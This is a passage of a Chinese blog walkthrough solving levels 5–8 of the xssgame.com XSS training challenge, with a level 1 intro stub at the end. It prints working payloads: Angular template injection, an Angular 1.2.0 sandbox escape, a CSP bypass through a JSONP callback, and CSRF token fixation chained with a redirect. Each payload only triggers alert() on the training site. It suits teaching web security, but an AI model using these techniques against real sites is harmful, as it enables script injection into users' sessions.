alt=\"Level_5_Welcome\"></p>\n<p>有请我们的翻译君：</p>\n<blockquote>\n<p>Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。<br>这个挑战是为什么这很重要。<br>目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。  </p>\n</blockquote>\n<p>对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。</p>\n<p>「Angular是啥？」</p>\n<p><img src=\"/Image/hei1.jpeg\" alt=\"heiren\"></p>\n<p>其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。</p>\n<p>我们先常规思路分析一波，先看看页面文件的内容：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">      angular.module(<span class=\"string\">'myApp'</span>, [])</div><div class=\"line\">      .controller(<span class=\"string\">'myController'</span>, [<span class=\"string\">'$scope'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">$scope</span>) </span>&#123;</div><div class=\"line\">        $scope.query = <span class=\"string\">\"\"</span>;</div><div class=\"line\">        $scope.alert = <span class=\"built_in\">window</span>.alert;</div><div class=\"line\">      &#125;]);</div><div class=\"line\"></div><div class=\"line\">      <span class=\"keyword\">var</span> UTM_PARAMS = [<span class=\"string\">\"utm_content\"</span>, <span class=\"string\">\"utm_medium\"</span>, <span class=\"string\">\"utm_source\"</span>,</div><div class=\"line\">          <span class=\"string\">\"utm_campaign\"</span>, <span class=\"string\">\"utm_term\"</span>]</div><div class=\"line\"></div><div class=\"line\">      <span class=\"keyword\">if</span> (location.search)</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"keyword\">var</span> params = location.search.substring(<span class=\"number\">1</span>).split(<span class=\"string\">'&amp;'</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p <span class=\"keyword\">in</span> params) &#123;</div><div class=\"line\">          <span class=\"keyword\">var</span> r = params[p].split(<span class=\"string\">'='</span>);</div><div class=\"line\"></div><div class=\"line\">          <span class=\"keyword\">if</span> (r.length == <span class=\"number\">2</span> &amp;&amp; UTM_PARAMS.indexOf(r[<span class=\"number\">0</span>]) != <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">            <span class=\"keyword\">var</span> el = <span class=\"built_in\">document</span>.getElementsByName(r[<span class=\"number\">0</span>]);</div><div class=\"line\">            <span class=\"keyword\">if</span> (el.length) el[<span class=\"number\">0</span>].value = <span class=\"built_in\">decodeURIComponent</span>(r[<span class=\"number\">1</span>]);</div><div class=\"line\">          &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">      &#125;</div><div class=\"line\">    &lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这里就提供了足够的信息够我们过关了。<br>这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。<br>先定义了一个数组，用来过滤 URL 中的参数。<br>过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"demo2-query\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"query\"</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">\"140\"</span> <span class=\"attr\">ng-model</span>=<span class=\"string\">\"query\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"Enter query here...\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"utm_term\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"utm_campaign\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"cpc\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"demo2-button\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Search\"</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。<br>怎么搞呢？<br>我们先搜下 Angular 中 alert 怎么写：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;&#123;alert()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>好知道了这个我们构建 URL，就选择 ‘utm_term’ 这个节点吧：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term=&#123;&#123;alert()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>过关：</p>\n<p><img src=\"/Image/Level_5_Pass.png\" alt=\"Level_5_Pass\"></p>\n<p>(至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~)</p>\n<h2 id=\"LEVEL-6\"><a href=\"#LEVEL-6\" class=\"headerlink\" title=\"LEVEL 6\"></a>LEVEL 6</h2><p><a href=\"http://www.xssgame.com/rWKWwJGnAeyi\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_6_Welcome.png\" alt=\"Level_6_Welcome\"></p>\n<p>（前面那个关的 boss 死了，儿子又来了？？？）</p>\n<p>没什么卵用的翻译（其实还是有用的~）：</p>\n<blockquote>\n<p>导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。<br>目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。</p>\n</blockquote>\n<p>这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况：</p>\n<p><img src=\"/Image/Level_6_Search.png\" alt=\"Level_6_Search\"></p>\n<p>手动输入 <strong>query</strong> 使用 get 方式搜索：</p>\n<p><img src=\"/Image/Level_6_Query.png\" alt=\"Level_6_Query\"></p>\n<p>我们注意到页面均显示出我们之前搜索的字符串。</p>\n<p>新的页面中的代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">ng-non-bindable</span>&gt;</span>Sorry, no results were found for <span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>1234<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>.<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>‘ng-non-bindable’ 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们搞 form 中的那个。</p>\n<p>我们注意到这样一段代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。<br>这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。</p>\n<p><img src=\"/Image/Level_6_Google_XSS.png\" alt=\"Level_6_Google_XSS\"></p>\n<p>按照惯例，我们先看一下第一个：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</div></pre></td></tr></table></figure></p>\n<p><img src=\"/Image/Level_6_PortSwigger.png\" alt=\"Level_6_PortSwigger\"></p>\n<p>有兴趣的可以去看一下，写的头头是道啊~</p>\n<p>当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：<br>我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;&#123;a=<span class=\"string\">'constructor'</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class=\"number\">0</span>,<span class=\"string\">'alert(1)'</span>)()&#125;&#125;</div></pre></td></tr></table></figure>\n<p>直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是：</p>\n<p><img src=\"/Image/Level_6_Search_Para.png\" alt=\"Level_6_Search_Para\"></p>\n<p>我们拼一下 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&#123;&#123;a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>好，提交，过关：</p>\n<p><img src=\"/Image/hei2.jpeg\" alt=\"heiren\"></p>\n<p><img src=\"/Image/Level_6_Query_String.png\" alt=\"Level_6_Query_String\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">把&apos;&#123;&apos;、&apos;&#125;&apos;换成&apos;&amp;lcub;&apos;、&apos;&amp;rcub;&apos;试一下(google 来的~我也记不住是啥。)</div><div class=\"line\">也可以只替换&apos;&#123;&apos;,因为&apos;&#125;&apos;并没有被过滤，不过我查都查了，替！</div></pre></td></tr></table></figure></p>\n<p>新的 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&amp;rcub;&amp;rcub;</div></pre></td></tr></table></figure></p>\n<p>冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」：</p>\n<p><img src=\"/Image/Level_6_Pass.png\" alt=\"Level_6_Pass\"></p>\n<p>咳咳，过关过关……</p>\n<h2 id=\"LEVEL-7\"><a href=\"#LEVEL-7\" class=\"headerlink\" title=\"LEVEL 7\"></a>LEVEL 7</h2><p><a href=\"http://www.xssgame.com/wmOM2q5NJnZS\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_7_Welcome.png\" alt=\"Level_7_Welcome.png\"></p>\n<p>翻译君：</p>\n<blockquote>\n<p>内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。<br>这个挑战显示了一种常见的CSP旁路技术。<br>目标是再次使用应用程序中的循环来执行JavaScript alert()函数。</p>\n</blockquote>\n<p>其中提到了一个东西 ‘CSP’ 就是’内容安全策略’, 这是啥东西呢？</p>\n<blockquote>\n<p>内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。<br>– 来自 wiki 百科</p>\n</blockquote>\n<p>这次除了 (index) 文件，我们还有两个地方需要关注下：</p>\n<p><img src=\"/Image/Level_7_Web_DOM.png\" alt=\"Level_7_Web_DOM\"></p>\n<p>按照惯例，我们先看一下页面文件 (index)：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=YWJvdXQ=\"</span>&gt;</span>About Me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=Y2F0cw==\"</span>&gt;</span>Cats<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=ZG9ncw==\"</span>&gt;</span>Dogs<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/js/level7.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。</p>\n<p>我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">    <span class=\"comment\">//找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。</span></div><div class=\"line\">    <span class=\"comment\">//atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">callback</span>(<span class=\"params\">data</span>)</span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 通过代码判断，data 应该是 json 格式。</span></div><div class=\"line\">    <span class=\"comment\">// 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源</span></div><div class=\"line\">&#125;</div><div class=\"line\">main(); <span class=\"comment\">//执行 main 方法</span></div></pre></td></tr></table></figure></p>\n<p>这个代码段比较简单，我们看一下 ‘jsonp?menu=about’ 的内容：</p>\n<p><img src=\"/Image/Level_7_Web_Jsonp.png\" alt=\"level_7_Web_Jsonp\"></p>\n<p>我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 ‘jsonp’：</p>\n<p><img src=\"/Image/Level_7_Jsonp_XSS.png\" alt=\"Level_7_Jsonp_XSS\"></p>\n<p>呀呵，第一个就是知道创宇的文章: <a href=\"http://blog.knownsec.com/2015/03/jsonp_security_technic/\" target=\"_blank\" rel=\"external\">JSONP 安全攻防技术</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">JSONP：</div><div class=\"line\">JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 &lt;script&gt;&lt;/script&gt; 元素标签，远程调用 JSON 文件来实现数据传递。</div></pre></td></tr></table></figure>\n<p>这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。</p>\n<p>回到正题，文中有这样一段引起了我们的注意：</p>\n<p><img src=\"/Image/Level_7_Jsonp_XSS_Blog.png\" alt=\"Level_7_Jsonp_XSS_Blog\"></p>\n<p>我们用 callback 这个参数去我们的 Level 7 中测试一下：</p>\n<p><img src=\"/Image/Level_7_Callback_Test.png\" alt=\"Level_7_Callback_Test\"></p>\n<p>ok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。</p>\n<p>Level7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> m = location.search.match(<span class=\"string\">'menu=(.*)'</span>);<span class=\"comment\">// 查找了一下当前 URL 中 'menu=' 后面的参数</span></div><div class=\"line\">    <span class=\"keyword\">var</span> menu = m ? atob(m[<span class=\"number\">1</span>]) : <span class=\"string\">'about'</span>; <span class=\"comment\">// 如果没有获取到参数，则赋值为 'about'</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.write(<span class=\"string\">'&lt;script src=\"jsonp?menu='</span> + <span class=\"built_in\">encodeURIComponent</span>(menu) + <span class=\"string\">'\"&gt;&lt;/script&gt;'</span>); <span class=\"comment\">// 在页面中写入 &lt;script&gt; 标签 ，通过 src 请求资源</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。</p>\n<p>想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：’about’、’cats’、’dogs’。相应的会有三种 callback 的 JSON 对象。</p>\n<p>如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。</p>\n<p>我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，’atob’ 函数是解码，编码函数猜也猜到应该是 ‘btoa’ 了~<br>在 chrome 浏览器的控制台下输入：</p>\n<p><img src=\"/Image/Level_7_Btoa_Function.png\" alt=\"Level_7_Btoa_Function\"></p>\n<p>得到转码后的值，在输入到浏览器中：</p>\n<p><img src=\"/Image/Level_7_Ev1l_Response.png\" alt=\"Level_7_Ev1l_Response\"></p>\n<p>我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。</p>\n<p>后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」</p>\n<p>尝试通关：</p>\n<p>我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">先在控制台 btoa(&quot;&lt;img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt;&quot;) 得到 &quot;PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=&quot;</div><div class=\"line\">再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=</div></pre></td></tr></table></figure>\n<p><img src=\"/Image/Level_7_Img_Pass_Fail.png\" alt=\"Level_7_Img_Pass_Fail\"></p>\n<p>chrome 控制台红字提示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Refused to execute inline event handler because it violates the following Content Security Policy directive: &quot;default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/&quot;. Either the &apos;unsafe-inline&apos; keyword, a hash (&apos;sha256-...&apos;), or a nonce (&apos;nonce-...&apos;) is required to enable inline execution. Note also that &apos;script-src&apos; was not explicitly set, so &apos;default-src&apos; is used as a fallback.</div></pre></td></tr></table></figure></p>\n<p>因为 CSP 的关系，失败了。</p>\n<p>没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。</p>\n<p>先给个小提示：</p>\n<p><img src=\"/Image/Level_7_Pass_idea.png\" alt=\"Level_7_Pass_idea\"></p>\n<p>自己先想两分钟~</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">给 menu 传入经过 base64 编码后的：</div><div class=\"line\">    &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // 转义前为：&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;</div><div class=\"line\">会把</div><div class=\"line\">    &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;</div><div class=\"line\">显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为：</div><div class=\"line\">    alert();//(&#123;...&#125;)</div><div class=\"line\">alert(); 后面被注释掉，执行 alert();</div></pre></td></tr></table></figure>\n<p>最后我们组织的 URL 为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+</div></pre></td></tr></table></figure></p>\n<p>过关：</p>\n<p><img src=\"/Image/Level_7_Pass.png\" alt=\"Level_7_Pass\"></p>\n<h2 id=\"Level-8\"><a href=\"#Level-8\" class=\"headerlink\" title=\"Level 8\"></a>Level 8</h2><p><a href=\"http://www.xssgame.com/d9u16LTxchEi\" target=\"_blank\" rel=\"external\">最后一关的贴心传送门 QAQ</a></p>\n<p><img src=\"/Image/Level_8_Welcome.png\" alt=\"Level_8_Welcome\"></p>\n<blockquote>\n<p>This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.</p>\n</blockquote>\n<p>好，我们继续无视提示信息，来看一下这一关。</p>\n<p>尊敬下上一关，我们先看一下 Level8.js 的内容：</p>\n<p><img src=\"/Image/Level_8_Level8js.png\" alt=\"Level_8_Level8js\"></p>\n<p>这个文件负责读取 cookie 的信息，如果读取到了 ‘name’ 的内容，就 document.write 到页面上。<br>通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&amp;*，他一显示到页面上不就……</p>\n<p>行了，别意淫了：</p>\n<p><img src=\"/Image/Level_8_CSP.png\" alt=\"Level_8_CSP\"></p>\n<p>我们来看看有没有其他可以利用的地方呢。先试试功能吧。</p>\n<p>我们随便设置一下名字：</p>\n<p><img src=\"/Image/Level_8_Set_Name.png\" alt=\"Level_8_Set_Name\"></p>\n<p>点击 Set 看看发生了什么:</p>\n<p><img src=\"/Image/Level_8_Set_End.png\" alt=\"Level_8_Set_End\"></p>\n<p>页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=Geekaleo&amp;redirect=index</div><div class=\"line\">其中：</div><div class=\"line\">set?name=name&amp;value=Geekaleo&amp;redirect=index</div><div class=\"line\">name=name value=Geekaleo 不禁让人菊花一紧</div><div class=\"line\">那我：</div><div class=\"line\">name=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……</div><div class=\"line\"></div><div class=\"line\">redirect=index 显然这个参数是用来跳转的</div></pre></td></tr></table></figure></p>\n<p>set csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水：</p>\n<p><img src=\"/Image/Level_8_Send.png\" alt=\"Level_8_Send\"></p>\n<p>我们接到了一个警告福利：</p>\n<p><img src=\"/Image/Level_8_Send_Fail.png\" alt=\"Level_8_Send_Fail\"></p>\n<p>这里我们得到了几个有用的信息：</p>\n<blockquote>\n<p>1.我们输入的不合法金额也就是 ‘amount’ 参数的值被返回到了前台打印了出来。<br>2.此页面没有 CSP 的标识。<br>3.csrf_token 作为参数传递给后台。  </p>\n</blockquote>\n<p>根据前两点呢，我们测试一下 把 ‘amount’ 的内容改成一段能够触发 alert() 的脚本：</p>\n<p><img src=\"/Image/Level_8_Pass_Fail.png\" alt=\"Level_8_Pass_Fail\"></p>\n<p>成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的：</p>\n<p><img src=\"/Image/Level_8_Token_Not_Same.png\" alt=\"Level_8_Token_Not_Same\"></p>\n<p>这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。</p>\n<p>我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。</p>\n<p>OK，我们来构建URL：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass</div><div class=\"line\"></div><div class=\"line\">这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 &amp; 符会被截断。</div><div class=\"line\"></div><div class=\"line\">所以我们这里 把这个 &apos;redirect=&apos; 后面的内容处理一下，chrome 控制台：</div><div class=\"line\">encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;)</div><div class=\"line\">得到返回值：</div><div class=\"line\">transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass</div><div class=\"line\"></div><div class=\"line\">好我们替换一下 URL：</div><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass</div></pre></td></tr></table></figure>\n<p>:) 过关：</p>\n<p><img src=\"/Image/Level_8_Pass.png\" alt=\"Level_8_Pass\"></p>\n<p>愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间……</p>\n<p><img src=\"/Image/All_Level_Pass.png\" alt=\"All_Level_Pass\"></p>\n<p>「别等了，没彩蛋…… QAQ」</p>\n","site":{"data":{}},"excerpt":"<p>此链接只能墙外围观享用</p>\n<p>主站：<a href=\"http://www.xssgame.com\" target=\"_blank\" rel=\"external\">www.xssgame.com</a> </p>\n<p><img src=\"/Image/Start_Playing.png\" alt=\"StartPlay\">  </p>","more":"<hr>\n<p>刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。<br>这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了……</p>\n<p>下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。</p>\n<h2 id=\"LEVEL-1\"><a href=\"#LEVEL-1\" class=\"headerlink\" title=\"LEVEL 1\"></a>LEVEL 1</h2><p><a href=\"http://www.xssgame.com/m4KKGHi2rVUN\" target=\"_blank\" rel=\"external\">贴心的传送门</a></p>\n<p><img src=\"/Image/Level_1_Welcome.png\" alt=\"StartPlay\"><br>上面的英文大致是个玩法的介绍和一些关于本关的信息：  